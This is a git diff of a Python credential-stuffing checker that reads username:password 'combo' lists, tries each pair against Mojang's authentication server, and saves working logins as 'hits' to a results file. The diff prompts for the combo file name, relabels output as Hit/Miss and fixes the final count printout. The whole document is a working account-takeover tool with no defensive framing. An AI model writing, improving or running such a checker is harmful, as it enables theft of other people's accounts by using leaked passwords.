@@ -6,11 +6,10 @@ jsonheaders = {"Content-Type": "application/json", 'Pragma': 'no-cache'}
 
 auth = 'https://authserver.mojang.com/authenticate'
 
+nfa = 0
 hits = 0
 bad = 0
 checks = 0
-with open("combo.txt") as f:
-    lines = f.readlines()
 
 results = open("results.txt", "a")
 
@@ -31,15 +30,19 @@ def check(user, password):
     else:
         return 0
 
+comb = input('What is your combo text file name? ')
+with open(comb + ".txt") as f:
+    lines = f.readlines()
+
 for line in lines:
     a = line.split(':')
     user = a[0]
     pasd = a[1]
     if check(user, pasd) == 1:
-        print('[' + user + ':' + pasd + '] Succesful')
+        print('[' + user + ':' + pasd + '] Hit')
         hits += 1
         results.write(user + ':' + pasd)
     else:
-        print('[' + user + ':' + pasd + '] Bad')
+        print('[' + user + ':' + pasd + '] Miss')
         bad += 1
-print(' Hits : ' + hits + '\n Bads : ' + bad + '\n Total Checked : ' + checks)
+print(" Hits : " + str(hits) + "\n Bads : " + str(bad) + "\n Total Checked : " + str(checks))
